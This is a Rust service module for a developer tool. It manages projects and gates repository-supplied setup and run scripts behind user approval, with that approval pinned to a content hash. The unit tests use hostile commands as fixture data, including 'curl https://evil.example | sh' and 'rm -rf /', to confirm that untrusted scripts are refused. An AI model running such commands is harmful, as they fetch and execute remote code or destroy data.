use crate::error::{Result, ServiceError};
use core_engine::GitEngine;
use infra::db::entities::project;
use infra::db::repo::{ProjectRepo, WorkspaceRepo};
use sea_orm::DatabaseConnection;
use std::collections::HashSet;
use std::sync::Arc;

pub struct ProjectService {
    db: Arc<DatabaseConnection>,
    git_engine: GitEngine,
}

#[derive(Debug, serde::Serialize)]
pub struct ProjectCanDeleteResponse {
    pub can_delete: bool,
    pub active_workspace_count: u64,
}

/// Cleanup info for a single workspace within a project.
pub struct WorkspaceCleanupInfo {
    pub guid: String,
    pub name: String,
    pub branch: String,
    pub github_pr_data: Option<String>,
    pub github_issue_data: Option<String>,
}

/// All data needed to clean up a project's worktrees in the background.
pub struct ProjectCleanupInfo {
    pub project_id: String,
    pub repo_path: String,
    pub workspaces: Vec<WorkspaceCleanupInfo>,
}

/// Path of the project-local script file, relative to the project root.
pub const PROJECT_SCRIPTS_RELATIVE_PATH: &str = ".atmos/scripts/atmos.json";

/// A project's `.atmos` scripts plus whether the user has accepted this exact
/// content.
///
/// `setup` and `run` are executed as shell commands, and the file travels with
/// the repository, so a clone or a `git pull` can introduce commands the user
/// never wrote. Trust is therefore pinned to the content hash rather than to the
/// project: when the file changes, `trusted` goes back to false until the user
/// accepts the new content.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ProjectScripts {
    pub scripts: serde_json::Value,
    /// `None` when the project has no script file.
    pub hash: Option<String>,
    pub trusted: bool,
}

impl ProjectScripts {
    /// No file means nothing can execute, so there is nothing to confirm.
    fn empty() -> Self {
        Self {
            scripts: serde_json::json!({}),
            hash: None,
            trusted: true,
        }
    }

    /// Command stored under `field`, regardless of trust. For display only —
    /// review UI and the script editor need to show content that is not trusted
    /// yet.
    pub fn command(&self, field: &str) -> Option<&str> {
        self.scripts[field]
            .as_str()
            .map(str::trim)
            .filter(|value| !value.is_empty())
    }

    /// Command under `field`, but only once the user accepted this file.
    ///
    /// Execution paths must go through this instead of reading `scripts`
    /// directly. Trust is recorded per file, so any new executable field (today
    /// `purge` has no runner; that may change) is gated by construction rather
    /// than by remembering to add a check.
    pub fn trusted_command(&self, field: &str) -> Option<&str> {
        if !self.trusted {
            return None;
        }
        self.command(field)
    }
}

/// Stable fingerprint of the script file's raw bytes.
pub fn hash_scripts_content(content: &str) -> String {
    use sha2::{Digest, Sha256};
    format!("{:x}", Sha256::digest(content.as_bytes()))
}

impl ProjectService {
    pub fn new(db: Arc<DatabaseConnection>) -> Self {
        Self {
            db,
            git_engine: GitEngine::new(),
        }
    }

    pub async fn list_projects(&self) -> Result<Vec<project::Model>> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.list().await?)
    }

    pub async fn create_project(
        &self,
        name: String,
        main_file_path: String,
        sidebar_order: i32,
        border_color: Option<String>,
    ) -> Result<project::Model> {
        let repo = ProjectRepo::new(&self.db);
        let default_branch = self
            .git_engine
            .get_default_branch(std::path::Path::new(&main_file_path))
            .unwrap_or(None);
        Ok(repo
            .create(
                name,
                main_file_path,
                sidebar_order,
                border_color,
                default_branch,
            )
            .await?)
    }

    /// Read a project's `.atmos` scripts and decide whether they may run.
    ///
    /// Callers must treat `trusted == false` as "do not execute": the file is
    /// repository content, so it can arrive from a clone or a pull without the
    /// user ever having seen it.
    pub async fn read_project_scripts(&self, guid: String) -> Result<ProjectScripts> {
        let repo = ProjectRepo::new(&self.db);
        let project = repo
            .find_by_guid(&guid)
            .await?
            .ok_or_else(|| ServiceError::NotFound(format!("Project {} not found", guid)))?;

        let scripts_path =
            std::path::Path::new(&project.main_file_path).join(PROJECT_SCRIPTS_RELATIVE_PATH);
        let Ok(content) = std::fs::read_to_string(&scripts_path) else {
            return Ok(ProjectScripts::empty());
        };

        let hash = hash_scripts_content(&content);
        let trusted = project.trusted_scripts_hash.as_deref() == Some(hash.as_str());

        Ok(ProjectScripts {
            scripts: serde_json::from_str(&content).unwrap_or_else(|_| serde_json::json!({})),
            hash: Some(hash),
            trusted,
        })
    }

    /// Accept the current script content on the user's behalf.
    ///
    /// `expected_hash` is the content the user was actually shown. Rejecting a
    /// mismatch keeps a file that changed between display and click from being
    /// trusted sight-unseen.
    pub async fn trust_project_scripts(
        &self,
        guid: String,
        expected_hash: String,
    ) -> Result<ProjectScripts> {
        let current = self.read_project_scripts(guid.clone()).await?;
        let Some(current_hash) = current.hash.clone() else {
            return Err(ServiceError::Validation(
                "Project has no .atmos scripts to trust".to_string(),
            ));
        };
        if current_hash != expected_hash {
            return Err(ServiceError::Validation(
                "Scripts changed since they were shown; review them again".to_string(),
            ));
        }

        ProjectRepo::new(&self.db)
            .update_trusted_scripts_hash(&guid, Some(current_hash))
            .await?;

        Ok(ProjectScripts {
            trusted: true,
            ..current
        })
    }

    /// Trust whatever is on disk now, without a hash round-trip.
    ///
    /// Only for content the user just authored through the app (script editor):
    /// re-confirming what they typed themselves would be noise.
    pub async fn trust_current_project_scripts(&self, guid: String) -> Result<()> {
        let current = self.read_project_scripts(guid.clone()).await?;
        if let Some(hash) = current.hash {
            ProjectRepo::new(&self.db)
                .update_trusted_scripts_hash(&guid, Some(hash))
                .await?;
        }
        Ok(())
    }

    /// Soft-delete project and all its workspaces (DB only, no git cleanup).
    /// Returns an error if the project has active workspaces.
    pub async fn delete_project(&self, guid: String) -> Result<()> {
        let project_repo = ProjectRepo::new(&self.db);
        let workspace_repo = WorkspaceRepo::new(&self.db);

        // Validate: no active workspaces
        let active_count = workspace_repo.count_active_by_project(&guid).await?;
        if active_count > 0 {
            return Err(ServiceError::Processing(format!(
                "Cannot delete project with {} active workspace(s)",
                active_count
            )));
        }

        let _project = project_repo
            .find_by_guid(&guid)
            .await?
            .ok_or_else(|| ServiceError::NotFound(format!("Project {} not found", guid)))?;

        // Membership cleanup + workspace/project soft-delete must commit together so a
        // mid-delete failure never leaves dangling memberships or half-deleted children.
        // Workspace memberships are resolved inside the repo transaction (subquery), not
        // from a pre-txn snapshot that can race with concurrent workspace creation.
        Ok(project_repo
            .soft_delete_with_group_memberships(&guid)
            .await?)
    }

    /// Gather cleanup info for all workspaces in a project (for background cleanup).
    /// Must be called BEFORE `delete_project` since it reads workspace data.
    pub async fn get_project_cleanup_info(&self, guid: &str) -> Result<ProjectCleanupInfo> {
        let project_repo = ProjectRepo::new(&self.db);
        let workspace_repo = WorkspaceRepo::new(&self.db);

        let project = project_repo
            .find_by_guid(guid)
            .await?
            .ok_or_else(|| ServiceError::NotFound(format!("Project {} not found", guid)))?;

        let workspaces = workspace_repo.list_all_by_project(guid).await?;
        let repo_path = project.main_file_path.clone();

        let workspace_cleanups: Vec<WorkspaceCleanupInfo> = workspaces
            .into_iter()
            .map(|w| WorkspaceCleanupInfo {
                guid: w.guid,
                name: w.name,
                branch: w.branch,
                github_pr_data: w.github_pr_data,
                github_issue_data: w.github_issue_data,
            })
            .collect();

        Ok(ProjectCleanupInfo {
            project_id: guid.to_string(),
            repo_path,
            workspaces: workspace_cleanups,
        })
    }

    pub async fn check_can_delete_from_archive_modal(
        &self,
        guid: String,
    ) -> Result<ProjectCanDeleteResponse> {
        let workspace_repo = WorkspaceRepo::new(&self.db);
        let active_count = workspace_repo.count_active_by_project(&guid).await?;
        Ok(ProjectCanDeleteResponse {
            can_delete: active_count == 0,
            active_workspace_count: active_count,
        })
    }

    pub async fn update_color(&self, guid: String, color: Option<String>) -> Result<()> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.update_color(&guid, color).await?)
    }

    pub async fn update_logo_path(&self, guid: String, logo_path: Option<String>) -> Result<()> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.update_logo_path(&guid, logo_path).await?)
    }

    pub async fn update_target_branch(
        &self,
        guid: String,
        target_branch: Option<String>,
    ) -> Result<()> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.update_target_branch(&guid, target_branch).await?)
    }

    pub async fn update_target_branch_if_null(
        &self,
        guid: String,
        target_branch: String,
    ) -> Result<bool> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo
            .update_target_branch_if_null(&guid, target_branch)
            .await?)
    }

    pub async fn get_project(&self, guid: String) -> Result<Option<project::Model>> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.find_by_guid(&guid).await?)
    }

    pub async fn existing_non_deleted_project_guids(
        &self,
        candidates: &[String],
    ) -> Result<HashSet<String>> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.existing_non_deleted_guids(candidates).await?)
    }

    pub async fn update_order(&self, guid: String, order: i32) -> Result<()> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.update_order(&guid, order).await?)
    }

    /// Get project terminal layout
    pub async fn get_terminal_layout(&self, guid: String) -> Result<Option<String>> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.get_terminal_layout(&guid).await?)
    }

    /// Update project terminal layout
    pub async fn update_terminal_layout(&self, guid: String, layout: Option<String>) -> Result<()> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.update_terminal_layout(&guid, layout).await?)
    }

    /// Get project maximized terminal ID
    pub async fn get_maximized_terminal_id(&self, guid: String) -> Result<Option<String>> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo.get_maximized_terminal_id(&guid).await?)
    }

    /// Update project maximized terminal ID
    pub async fn update_maximized_terminal_id(
        &self,
        guid: String,
        terminal_id: Option<String>,
    ) -> Result<()> {
        let repo = ProjectRepo::new(&self.db);
        Ok(repo
            .update_maximized_terminal_id(&guid, terminal_id)
            .await?)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use infra::db::entities::base::BaseFields;
    use infra::db::migration::Migrator;
    use sea_orm::{ActiveModelTrait, Database, Set};
    use sea_orm_migration::MigratorTrait;

    /// Project rooted at a temp dir, with no scripts trusted yet.
    async fn project_with_root(root: &std::path::Path) -> (ProjectService, String) {
        let db = Database::connect("sqlite::memory:").await.expect("sqlite");
        Migrator::up(&db, None).await.expect("migrate");

        let base = BaseFields::new();
        let guid = base.guid.clone();
        project::ActiveModel {
            guid: Set(guid.clone()),
            created_at: Set(base.created_at),
            updated_at: Set(base.updated_at),
            is_deleted: Set(false),
            name: Set("demo".into()),
            main_file_path: Set(root.display().to_string()),
            sidebar_order: Set(0),
            border_color: Set(None),
            logo_path: Set(None),
            is_open: Set(true),
            target_branch: Set(None),
            terminal_layout: Set(None),
            maximized_terminal_id: Set(None),
            trusted_scripts_hash: Set(None),
        }
        .insert(&db)
        .await
        .expect("project");

        (ProjectService::new(Arc::new(db)), guid)
    }

    fn write_scripts(root: &std::path::Path, content: &str) {
        let path = root.join(PROJECT_SCRIPTS_RELATIVE_PATH);
        std::fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
        std::fs::write(&path, content).expect("write scripts");
    }

    #[tokio::test]
    async fn scripts_from_a_fresh_clone_start_untrusted() {
        let root = tempfile::tempdir().expect("tempdir");
        let (service, guid) = project_with_root(root.path()).await;
        write_scripts(root.path(), r#"{"setup":"curl https://evil.example | sh"}"#);

        let scripts = service
            .read_project_scripts(guid)
            .await
            .expect("read scripts");
        assert!(!scripts.trusted);
        assert!(scripts.hash.is_some());
    }

    #[tokio::test]
    async fn accepting_scripts_marks_that_exact_content_trusted() {
        let root = tempfile::tempdir().expect("tempdir");
        let (service, guid) = project_with_root(root.path()).await;
        write_scripts(root.path(), r#"{"setup":"bun install"}"#);

        let scripts = service
            .read_project_scripts(guid.clone())
            .await
            .expect("read scripts");
        let hash = scripts.hash.expect("hash");

        service
            .trust_project_scripts(guid.clone(), hash)
            .await
            .expect("trust");

        let after = service
            .read_project_scripts(guid)
            .await
            .expect("read scripts");
        assert!(after.trusted);
    }

    /// The regression this whole feature exists for: trusting once must not keep
    /// a later `git pull` from being reviewed.
    #[tokio::test]
    async fn rewriting_scripts_after_trust_requires_confirmation_again() {
        let root = tempfile::tempdir().expect("tempdir");
        let (service, guid) = project_with_root(root.path()).await;
        write_scripts(root.path(), r#"{"setup":"bun install"}"#);

        let hash = service
            .read_project_scripts(guid.clone())
            .await
            .expect("read scripts")
            .hash
            .expect("hash");
        service
            .trust_project_scripts(guid.clone(), hash)
            .await
            .expect("trust");

        write_scripts(
            root.path(),
            r#"{"setup":"bun install && curl https://evil.example | sh"}"#,
        );

        let after = service
            .read_project_scripts(guid)
            .await
            .expect("read scripts");
        assert!(!after.trusted);
    }

    #[tokio::test]
    async fn trusting_a_stale_hash_is_rejected() {
        let root = tempfile::tempdir().expect("tempdir");
        let (service, guid) = project_with_root(root.path()).await;
        write_scripts(root.path(), r#"{"setup":"bun install"}"#);

        let stale = service
            .read_project_scripts(guid.clone())
            .await
            .expect("read scripts")
            .hash
            .expect("hash");

        // File changes between being shown and being accepted.
        write_scripts(root.path(), r#"{"setup":"rm -rf /"}"#);

        assert!(service
            .trust_project_scripts(guid.clone(), stale)
            .await
            .is_err());
        assert!(
            !service
                .read_project_scripts(guid)
                .await
                .expect("read scripts")
                .trusted
        );
    }

    #[tokio::test]
    async fn editing_scripts_in_app_trusts_them_without_a_prompt() {
        let root = tempfile::tempdir().expect("tempdir");
        let (service, guid) = project_with_root(root.path()).await;
        write_scripts(root.path(), r#"{"setup":"bun install"}"#);

        service
            .trust_current_project_scripts(guid.clone())
            .await
            .expect("trust current");

        assert!(
            service
                .read_project_scripts(guid)
                .await
                .expect("read scripts")
                .trusted
        );
    }

    #[tokio::test]
    async fn untrusted_scripts_expose_content_for_review_but_not_for_execution() {
        let root = tempfile::tempdir().expect("tempdir");
        let (service, guid) = project_with_root(root.path()).await;
        write_scripts(
            root.path(),
            r#"{"setup":"bun install","run":"just dev","purge":"rm -rf node_modules"}"#,
        );

        let scripts = service
            .read_project_scripts(guid.clone())
            .await
            .expect("read scripts");
        assert!(!scripts.trusted);
        // Review has to be able to show every command in the file...
        assert_eq!(scripts.command("setup"), Some("bun install"));
        assert_eq!(scripts.command("run"), Some("just dev"));
        assert_eq!(scripts.command("purge"), Some("rm -rf node_modules"));
        // ...while every execution path is refused, including fields that have
        // no runner today.
        assert_eq!(scripts.trusted_command("setup"), None);
        assert_eq!(scripts.trusted_command("run"), None);
        assert_eq!(scripts.trusted_command("purge"), None);

        let hash = scripts.hash.expect("hash");
        service
            .trust_project_scripts(guid.clone(), hash)
            .await
            .expect("trust");

        let after = service
            .read_project_scripts(guid)
            .await
            .expect("read scripts");
        assert_eq!(after.trusted_command("run"), Some("just dev"));
    }

    #[tokio::test]
    async fn changing_only_run_also_revokes_trust_for_setup() {
        let root = tempfile::tempdir().expect("tempdir");
        let (service, guid) = project_with_root(root.path()).await;
        write_scripts(root.path(), r#"{"setup":"bun install","run":"just dev"}"#);

        let hash = service
            .read_project_scripts(guid.clone())
            .await
            .expect("read scripts")
            .hash
            .expect("hash");
        service
            .trust_project_scripts(guid.clone(), hash)
            .await
            .expect("trust");

        // Only `run` changes, but trust is per file, so `setup` must stop too.
        write_scripts(
            root.path(),
            r#"{"setup":"bun install","run":"curl https://evil.example | sh"}"#,
        );

        let after = service
            .read_project_scripts(guid)
            .await
            .expect("read scripts");
        assert!(!after.trusted);
        assert_eq!(after.trusted_command("setup"), None);
    }

    #[test]
    fn hash_is_stable_and_content_sensitive() {
        let a = r#"{"setup":"bun install"}"#;
        assert_eq!(hash_scripts_content(a), hash_scripts_content(a));
        assert_ne!(
            hash_scripts_content(a),
            hash_scripts_content(r#"{"setup":"curl evil.example | sh"}"#)
        );
    }

    #[test]
    fn whitespace_only_edits_still_change_the_hash() {
        // Trust is pinned to raw bytes, so any rewrite of the file re-prompts
        // rather than trying to decide which edits are "meaningful".
        assert_ne!(
            hash_scripts_content(r#"{"setup":"a"}"#),
            hash_scripts_content("{\"setup\":\"a\"}\n")
        );
    }

    #[test]
    fn a_project_without_scripts_needs_no_confirmation() {
        let scripts = ProjectScripts::empty();
        assert!(scripts.trusted);
        assert!(scripts.hash.is_none());
    }
}
